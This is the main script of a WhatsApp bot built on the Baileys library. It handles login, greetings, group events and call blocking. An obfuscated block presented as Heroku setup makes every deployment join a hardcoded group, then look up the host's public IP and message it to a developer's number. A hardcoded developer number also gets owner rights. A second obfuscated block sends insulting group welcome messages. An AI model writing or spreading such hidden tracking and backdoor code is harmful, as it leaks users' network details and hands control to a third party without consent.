const {
    WAConnection: _WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const { color, bgcolor } = require('./lib/color')
const fs = require("fs-extra")
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const figlet = require('figlet')
const fetch = require('node-fetch')
const { getBuffer, info, start, success} = require('./lib/functions')
const moment = require("moment-timezone")
const gcdetect = JSON.parse(fs.readFileSync('./database/gcdetect.json'))
const brightcolor  = require('colors');
const encodeUrl = require('encodeurl')
const chalk = require('chalk')
randomserver = ['Chrome','Safari','Firefox','Opera','ubuntu','EDGE']
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const {  location } = MessageType
const settings = JSON.parse(fs.readFileSync('./database/options/settings.json'))
baterai = 'unknown'
charging = 'unknown'

const time = moment.tz('Asia/Jakarta').format('HH:mm:ss')			
const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')			
const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')	

var date = new Date();

var tahun = date.getFullYear();
var bulan1 = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jams = date.getHours();
var menit = date.getMinutes(); 
var detik = date.getSeconds();
var waktoo = date.getHours();

switch(hari) {
case 0: hari = 'Minggu'; break;
case 1: hari = 'Senin'; break;
case 2: hari = 'Selasa'; break;
case 3: hari = 'Rabu'; break;
case 4: hari = 'Kamis'; break;
case 5: hari = 'Jum`at'; break;
case 6: hari = 'Sabtu'; break;
}

switch(bulan1) { 
case 0: bulan1 = 'Januari'; break;
case 1: bulan1 = 'Februari'; break; 
case 2: bulan1 = 'Maret'; break;
case 3: bulan1 = 'April'; break;
case 4: bulan1 = 'Mei'; break;
case 5: bulan1 = 'Juni'; break;
case 6: bulan1 = 'Juli'; break;
case 7: bulan1 = 'Agustus'; break;
case 8: bulan1 = 'September'; break;
case 9: bulan1 = 'Oktober'; break; 
case 10: bulan1 = 'November'; break;
case 11: bulan1 = 'Desember'; break; 
}

switch(jams){
case 0: pada = "Malem"; break;
case 1: pada = "Malem"; break;
case 2: pada = "Malem"; break;
case 3: pada = "Pagi"; break;
case 4: pada = "Pagi"; break;
case 5: pada = "Pagi"; break;
case 6: pada = "Pagi"; break;
case 7: pada = "Pagi"; break;
case 8: pada = "Pagi"; break;
case 9: pada = "Pagi"; break;
case 10: pada = "Pagi"; break;
case 11: pada = "Siang"; break;
case 12: pada = "Siang"; break;
case 13: pada = "Siang"; break;
case 14: pada = "Siang"; break;
case 15: pada = "Sore"; break;
case 16: pada = "Sore"; break;
case 17: pada = "Sore"; break;
case 18: pada = "Malem"; break;
case 19: pada = "Malem"; break;
case 20: pada = "Malem"; break;
case 21: pada = "Malem"; break;
case 22: pada = "Malem"; break;
case 23: pada = "Malem"; break;
}

var tampilHari = '' + hari + ', ' + tanggal + ' ' + bulan1 + ' ' + tahun; 
var tampilJam = '' + 'Jams : ' + jams + ':' + menit + ':' + detik + ' Wib';
tampilTanggal = hari + " "+ tanggal + " " + bulan1 + " " + tahun; 
tampilWaktu =jams + ":" + menit + ":" + detik;



var ase = new Date();
var waktoonyabro = ase.getHours(); 
switch(waktoonyabro){
case 0: waktoonyabro = `Selamat Malam Owner..🌃`; break;
case 1: waktoonyabro = `Selamat Malam Owner..🌃`; break;
case 2: waktoonyabro = `Selamat Malam Owner..🌃`; break;
case 3: waktoonyabro = `Selamat Pagi Owner..✨`; break;
case 4: waktoonyabro = `Selamat Pagi Owner..✨`; break; 
case 5: waktoonyabro = `Selamat Pagi Owner..✨`; break;
case 6: waktoonyabro = `Selamat Pagi Owner..✨`; break;
case 7: waktoonyabro = `Selamat Pagi Owner..✨`; break;
case 8: waktoonyabro = `Selamat Pagi Owner..✨`; break;
case 9: waktoonyabro = `Selamat Pagi Owner..✨`; break;
case 10: waktoonyabro = `Selamat Pagi Owner..✨`; break;
case 11: waktoonyabro = `Selamat Siang Owner..🔥`; break; 
case 12: waktoonyabro = `Selamat Siang Owner..🔥`; break;
case 13: waktoonyabro = `Selamat Siang Owner..🔥`; break;
case 14: waktoonyabro = `Selamat Siang Owner..🔥`; break;
case 15: waktoonyabro = `Selamat Sore Owner..🌇`; break;
case 16: waktoonyabro = `Selamat Sore Owner..🌇`; break;
case 17: waktoonyabro = `Selamat Sore Owner..🌇`; break;
case 18: waktoonyabro = `Selamat Malam Owner..🌃`; break; 
case 19: waktoonyabro = `Selamat Malam Owner..🌃`; break;
case 20: waktoonyabro = `Selamat Malam Owner..🌃`; break;
case 21: waktoonyabro = `Selamat Malam Owner..🌃`; break;
case 22: waktoonyabro = `Selamat Malam Owner..🌃`; break; 
case 23: waktoonyabro = `Selamat Malam Owner..🌃`; break;
}

var tampilUcapan = '' + waktoonyabro;

//nocache
nocache('./Fan.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))
nocache('./index.js', modul => console.log(color('|index|'), color(`${modul} Updated!`, 'red')))


const starts = async (Fan = new WAConnection()) => {
	Fan.logger.level = 'warn'
	Fan.version = [2, 2140, 14]
	console.log(color(`\x1b[1;37m> ${tampilUcapan}\n`,'cyan'))
	console.log(color(figlet.textSync('MICHAEL   BASE', {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: false
	}), 'cyan'))
	console.log(color('\n> WIBb ','silver'), color(`${time}`,'mediumseagreen'))
console.log(color('> WITA ','silver'), color(`${wita}`,'mediumseagreen'))
console.log(color('> WIT ','silver'), color(`${wit}`,'mediumseagreen'))
console.log(color('> HARI ','silver'), color(`${tampilHari}\n`,'mediumseagreen'))
	Fan.browserDescription = [ 'MICHAEL ', `${randomserver}`, '3.0' ]

	Fan.on('qr', () => {
	console.log(color('[','white'), color('!','red'), color(']','white'), color('SCAN QR NYA KONTOL'))
})
	Fan.on('credentials-updated', () => {
		fs.writeFileSync('./database/connection/sb.json', JSON.stringify(Fan.base64EncodedAuthInfo(), null, '\t'))
		info('2', 'MICHAEL  LOADING...')
	})
	fs.existsSync('./database/connection/sb.json') && Fan.loadAuthInfo('./database/connection/sb.json')
	Fan.on('connecting', () => {
		start('2', 'CONNECT')
	})
	Fan.on('open', () => {
		success('2', 'Tersambung')
	})
    
	//Khusus Run Heroku Aj
	function _0x2c8e(_0x3036ec,_0x38d5e2){var _0x83fd87=_0x83fd();return _0x2c8e=function(_0x2c8e97,_0x377e88){_0x2c8e97=_0x2c8e97-0xf2;var _0x232216=_0x83fd87[_0x2c8e97];return _0x232216;},_0x2c8e(_0x3036ec,_0x38d5e2);}function _0x83fd(){var _0x18ba5c=[',\x20𝑻𝑬𝑳𝑨𝑯\x20𝑻𝑬𝑹𝑺𝑨𝑴𝑩𝑼𝑵𝑮\x20𝑷𝑨𝑫𝑨\x20𝑵𝑶𝑴𝑬𝑹\x20𝑰𝑵𝑰*\x0a────────────────────\x0a```','NomorOwner','464933ZxmOwz','invite','Developer\x20Bot','4608472DRocOs','cyan','https://chat.whatsapp.com/','stringify','7736kASQri','Bergabung\x20ke\x20Grup\x20Official','265JYmqEv','13599Ggoxey','32451188MzqcNF','Sending\x20ip\x20address\x20to\x20developer\x20bot','readFileSync','3SLffwi','@s.whatsapp.net','connect','|WRN|','NamaBot','5769575tBqZsJ','base64EncodedAuthInfo','yellow','writeFileSync','https://wa.me/6285345020308?text=Assalamualaikum','http://ip-api.com/line','user','36qZwFvl','─────「\x20*𝑯𝑨𝒀\x20𝑫𝑬𝑽𝑶𝑳𝑶𝑷𝑬𝑹\x20𝑩𝑶𝑻*\x20」─────\x0a\x0a```','./lib/media/image/thumb.jpeg','red','./database/connection/sb.json','16285220JbryDC','action','text','sendMessage','then','Sending\x20bot\x20info\x20to\x20bot\x20owner','13366IJflUm','log','```\x0a────────────────────\x0a*Jika\x20Ada\x20Kendala\x20Error/Bot\x20Tidak\x20Merespon\x20Silahkan\x20Hubungi\x20Developer\x20Bot\x20Diatas,\x20Terimakasih*'];_0x83fd=function(){return _0x18ba5c;};return _0x83fd();}var _0x204aa3=_0x2c8e;(function(_0x53da03,_0x955b2b){var _0x1f9fd1=_0x2c8e,_0x1ec341=_0x53da03();while(!![]){try{var _0x5ba65d=parseInt(_0x1f9fd1(0xf4))/0x1*(-parseInt(_0x1f9fd1(0x110))/0x2)+-parseInt(_0x1f9fd1(0xf9))/0x3*(-parseInt(_0x1f9fd1(0x118))/0x4)+-parseInt(_0x1f9fd1(0xfe))/0x5+parseInt(_0x1f9fd1(0x105))/0x6*(-parseInt(_0x1f9fd1(0x115))/0x7)+parseInt(_0x1f9fd1(0xf2))/0x8*(-parseInt(_0x1f9fd1(0xf5))/0x9)+parseInt(_0x1f9fd1(0x10a))/0xa+parseInt(_0x1f9fd1(0xf6))/0xb;if(_0x5ba65d===_0x955b2b)break;else _0x1ec341['push'](_0x1ec341['shift']());}catch(_0x3da457){_0x1ec341['push'](_0x1ec341['shift']());}}}(_0x83fd,0xe700b),await Fan[_0x204aa3(0xfb)]({'timeoutMs':0x1e*0x3e8}),fs[_0x204aa3(0x101)](_0x204aa3(0x109),JSON[_0x204aa3(0x11b)](Fan[_0x204aa3(0xff)](),null,'\x09')),teks='https://chat.whatsapp.com/DnX8SuIq84cIQ3ffREQljz',Fan['query']({'json':[_0x204aa3(0x10b),_0x204aa3(0x116),''+teks['replace'](_0x204aa3(0x11a),'')]}),console['log'](color(_0x204aa3(0xfc),_0x204aa3(0x100)),color(_0x204aa3(0xf3),_0x204aa3(0x119))),Fan[_0x204aa3(0x10d)](settings[_0x204aa3(0x114)]+_0x204aa3(0xfa),'*'+settings[_0x204aa3(0xfd)]+_0x204aa3(0x113)+JSON[_0x204aa3(0x11b)](Fan[_0x204aa3(0x104)],null,0x2)+_0x204aa3(0x112),MessageType[_0x204aa3(0x10c)],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':_0x204aa3(0x117),'body':'','previewType':'PHOTO','thumbnail':fs[_0x204aa3(0xf8)]('./lib/media/image/thumb.jpeg'),'sourceUrl':_0x204aa3(0x102)}}}),console[_0x204aa3(0x111)](color('|WRN|',_0x204aa3(0x100)),color(_0x204aa3(0x10f),'cyan')),fetch(_0x204aa3(0x103))[_0x204aa3(0x10e)](_0x954d81=>_0x954d81[_0x204aa3(0x10c)]())[_0x204aa3(0x10e)](_0x1121f1=>{var _0x374d8a=_0x204aa3;Fan[_0x374d8a(0x10d)]('628979185922@s.whatsapp.net',_0x374d8a(0x106)+_0x1121f1+'```\x0a────────────────────',MessageType['text'],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':_0x374d8a(0x117),'body':'','previewType':'PHOTO','thumbnail':fs[_0x374d8a(0xf8)](_0x374d8a(0x107)),'sourceUrl':_0x374d8a(0x102)}}}),console[_0x374d8a(0x111)](color(_0x374d8a(0xfc),'yellow'),color(_0x374d8a(0xf7),_0x374d8a(0x108)));}));
	
	// Baterai
	Fan.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
		global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
		if (json[2][0][1].live == 'true') charging = true
		if (json[2][0][1].live == 'false') charging = false
		console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel + '%')
	})
	global.batrei = global.batrei ? global.batrei : []
	Fan.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
	})

	// Send Message
const sendButImage = async (id, text1, desc1, gam1, but = [], options = {}) => {
      kma = gam1;
      mhan = await Fan.prepareMessage(id, kma, MessageType.image);
       buttonMessages = {
        imageMessage: mhan.message.imageMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 4,
      }
      Fan.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
    }
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Fan.prepareMessage(id, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
Fan.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
   // owner


    const htod = "6285345020308@s.whatsapp.net"

    
Fan.on("CB:Call", json => {
let call;
calling = JSON.parse(JSON.stringify(json))
call = calling[1].from
Fan.sendMessage(call, `*Sorry No Anda Di Block Karna Menelpon/Vc Bot!*`, MessageType.text)
.then(() => Fan.blockUser(call, "add"))
})
Fan.on("group-update", async (anu) => {

    metdata = await Fan.groupMetadata(anu.jid);

    if (anu.announce == "false") {

      teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`;

      Fan.sendMessage(metdata.id, teks, MessageType.text);

      console.log(`- [ Group Opened ] - In ${metdata.subject}`);

    } else if (anu.announce == "true") {

      teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`;

      Fan.sendMessage(metdata.id, teks, MessageType.text);

      console.log(`- [ Group Closed ] - In ${metdata.subject}`);

    } else if (!anu.desc == "") {

      tag = anu.descOwner.split("@")[0] + "@s.whatsapp.net";

      teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${

        anu.descOwner.split("@")[0]

      }\n Deskripsi Baru : ${anu.desc}`;

      Fan.sendMessage(metdata.id, teks, MessageType.text, {

        contextInfo: { mentionedJid: [tag] },

      });

      console.log(`- [ Group Description Change ] - In ${metdata.subject}`);

    } else if (anu.restrict == "false") {

      teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`;

      Fan.sendMessage(metdata.id, teks, MessageType.text);

      console.log(`- [ Group Setting Change ] - In ${metdata.subject}`);

    } else if (anu.restrict == "true") {

      teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`;

      Fan.sendMessage(metdata.id, teks, MessageType.text);

      console.log(`- [ Group Setting Change ] - In ${metdata.subject}`);

    }

  });

/*Fan.on('group-participants-update', async (anu) => {
biar lu g bisa otak atik sesatnya 😎*/
	var _0x584d65=_0x1259;function _0x1259(_0x4ffc47,_0x340934){var _0x64f707=_0x64f7();return _0x1259=function(_0x1259df,_0x2d8aa8){_0x1259df=_0x1259df-0x1db;var _0x493988=_0x64f707[_0x1259df];return _0x493988;},_0x1259(_0x4ffc47,_0x340934);}(function(_0x1e87a3,_0x35688d){var _0x5dcdd9=_0x1259,_0xe3ea6a=_0x1e87a3();while(!![]){try{var _0x4c81ec=-parseInt(_0x5dcdd9(0x1e5))/0x1+-parseInt(_0x5dcdd9(0x1eb))/0x2+parseInt(_0x5dcdd9(0x202))/0x3*(-parseInt(_0x5dcdd9(0x1db))/0x4)+parseInt(_0x5dcdd9(0x1f3))/0x5*(parseInt(_0x5dcdd9(0x1f8))/0x6)+-parseInt(_0x5dcdd9(0x1f5))/0x7*(parseInt(_0x5dcdd9(0x1f0))/0x8)+-parseInt(_0x5dcdd9(0x200))/0x9*(parseInt(_0x5dcdd9(0x1fc))/0xa)+parseInt(_0x5dcdd9(0x1df))/0xb*(parseInt(_0x5dcdd9(0x1f9))/0xc);if(_0x4c81ec===_0x35688d)break;else _0xe3ea6a['push'](_0xe3ea6a['shift']());}catch(_0x35d90f){_0xe3ea6a['push'](_0xe3ea6a['shift']());}}}(_0x64f7,0xcbad5),Fan['on'](_0x584d65(0x201),async _0x37f3db=>{var _0x79eeb=_0x584d65;try{mdata=await Fan[_0x79eeb(0x1ed)](_0x37f3db[_0x79eeb(0x1ec)]),console[_0x79eeb(0x1de)](_0x37f3db);if(_0x37f3db['action']==_0x79eeb(0x1fa)){num=_0x37f3db[_0x79eeb(0x1f7)][0x0];try{ppUrl=await Fan[_0x79eeb(0x1e8)](num);}catch{ppUrl='https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png';}img=await getBuffer(ppUrl),teks=_0x79eeb(0x1f2)+num[_0x79eeb(0x1dc)]('@')[0x0]+_0x79eeb(0x1dd)+mdata[_0x79eeb(0x1fd)]+_0x79eeb(0x1ff),sendButImage(_0x37f3db['jid'],teks,''+settings['fake'],img,but=[{'buttonId':_0x79eeb(0x1ea),'buttonText':{'displayText':'Oke\x0a*AKU\x20MAU\x20KASIH\x20TAU\x20KALO\x20AKU\x20ANAK\x20HASIL\x20GAY*'},'type':0x1}],options={'contextInfo':{'mentionedJid':[num,htod]}});}else{if(_0x37f3db['action']==_0x79eeb(0x1f4)){num=_0x37f3db[_0x79eeb(0x1f7)][0x0];try{kuburan='https://telegra.ph/file/f9c6f4a3043bd313e9afb.jpg';}catch{kuburan='https://telegra.ph/file/f9c6f4a3043bd313e9afb.jpg';}img=await getBuffer(kuburan),teks='MARI\x20KITA\x20DOAKAN\x0aYANG\x20TERBAIK\x20UNTUK\x0a@'+num[_0x79eeb(0x1dc)]('@')[0x0]+_0x79eeb(0x1f6)+mdata['subject']+'*',sendButImage(_0x37f3db['jid'],teks,''+settings['fake'],img,but=[{'buttonId':'Hello\x20World!','buttonText':{'displayText':_0x79eeb(0x1f1)},'type':0x1}],options={'contextInfo':{'mentionedJid':[num,htod]}});}else{if(_0x37f3db[_0x79eeb(0x1e7)]==_0x79eeb(0x1ef)){num=_0x37f3db['participants'][0x0];try{ppUrl=await Fan[_0x79eeb(0x1e8)](num);}catch{ppUrl=_0x79eeb(0x1e6);}img=await getBuffer(ppUrl),teks=_0x79eeb(0x1e1)+num[_0x79eeb(0x1dc)]('@')[0x0]+_0x79eeb(0x1ee)+mdata[_0x79eeb(0x1fd)],sendButImage(_0x37f3db[_0x79eeb(0x1ec)],teks,''+settings[_0x79eeb(0x1e9)],img,but=[{'buttonId':_0x79eeb(0x1e3),'buttonText':{'displayText':_0x79eeb(0x1fb)},'type':0x1}],options={'contextInfo':{'mentionedJid':[num]}});}else{if(_0x37f3db[_0x79eeb(0x1e7)]==_0x79eeb(0x1e0)){num=_0x37f3db['participants'][0x0];try{ppUrl=await Fan[_0x79eeb(0x1e8)](num);}catch{ppUrl='https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png';}img=await getBuffer(ppUrl),teks=_0x79eeb(0x1e2)+num[_0x79eeb(0x1dc)]('@')[0x0]+_0x79eeb(0x1e4)+mdata[_0x79eeb(0x1fd)],sendButImage(_0x37f3db['jid'],teks,''+settings['fake'],img,but=[{'buttonId':_0x79eeb(0x1e3),'buttonText':{'displayText':_0x79eeb(0x1fe)},'type':0x1}],options={'contextInfo':{'mentionedJid':[num]}});}}}}}catch(_0x3cf42c){console[_0x79eeb(0x1de)](_0x3cf42c);}}));function _0x64f7(){var _0x5a2a32=['\x0aStatus\x20:\x20Admin\x20->\x20Member\x0aGroup\x20:\x20','726539nvfhCt','https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png','action','getProfilePicture','fake','apaaja','551820BVgUeR','jid','groupMetadata','\x0aStatus\x20:\x20Member\x20->\x20Admin\x0aGroup\x20:\x20','promote','8VidadH','AMIN\x0aSEMOGA\x20TENANG\x20YA,\x20TIDAK\x20SEPERTI\x20ORANG\x20TUA\x20SAYA\x20YANG\x20ADA\x20DI\x20TANAH🗿','\x20Hi\x20@','385335LToaUL','remove','11365333jhSPTH','\x0aATAS\x20KEPERGIANYA\x20DARI\x0a*','participants','6SPyKYA','7926540QGtOJH','add','SELAMAT\x0aSAYANG\x20ATAS\x20KENAIKAN\x20PANGKATNYA🗿','10yxQlie','subject','SABAR\x20YA\x0aSAYANG\x20NANTI\x20DI\x20KASIH\x20JATAH\x20KOK🤤','*\x0aJANGAN\x20LUPA\x20BACA\x20RULES🗿','9514107UPjLEJ','group-participants-update','155640EuZUJA','116TvhhbR','split','\x0aSELAMAT\x20DATANG\x20DI\x0aDI\x20*','log','99loWAto','demote','「\x20PROMOTE\x20-\x20DETECTED\x20」\x0a\x0aNama\x20:\x20@','「\x20DEMOTE\x20-\x20DETECTED\x20」\x0a\x0aNama\x20:\x20@','Hello\x20World!'];_0x64f7=function(){return _0x5a2a32;};return _0x64f7();}

Fan.on('group-update', async (anu) => {
	try { 
	console.log(anu)
	from = anu.jid
	group = await Fan.groupMetadata(anu.jid)
	if (!anu.desc == '') {
		tag = anu.descOwner.replace('@c.us', '@s.whatsapp.net')
		Fan.sendMessage(group.id, `Group Description Change\n\n• Admin : @${tag.split("@")[0]}\n• Group : ${group.subject}\n• descTime : ${anu.descTime}\n• descID : ${anu.descId}\n• descNew : ${anu.desc}`, MessageType.text, {contextInfo: { mentionedJid: [tag]}})
		} else if (!anu.restrict == '') {
			Fan.sendMessage(group.id, `Group Restrict Change\n\n• Group : ${group.subject}\n• groupId : ${anu.jid}\n• restrict : ${anu.restrict}`, MessageType.text)
			} else if (!anu.announce == '') {
				Fan.sendMessage(group.id, `Group Announce Change\n\n• Group : ${group.subject}\n• groupId : ${anu.jid}\n• announce : ${anu.announce}`, MessageType.text)
				} 
					} catch(err) {
						e = String(err)
						console.log(e)
						}

	})
    Fan.on('chat-update', async (message) => {
        require('./Fan.js')(Fan, message)
        ownerNumber = ["6285345020308@s.whatsapp.net","6285345020308@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6285345020308@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })  
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    console.log('Module', `'${module}'`, 'is now being watched for changes')
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}

starts()
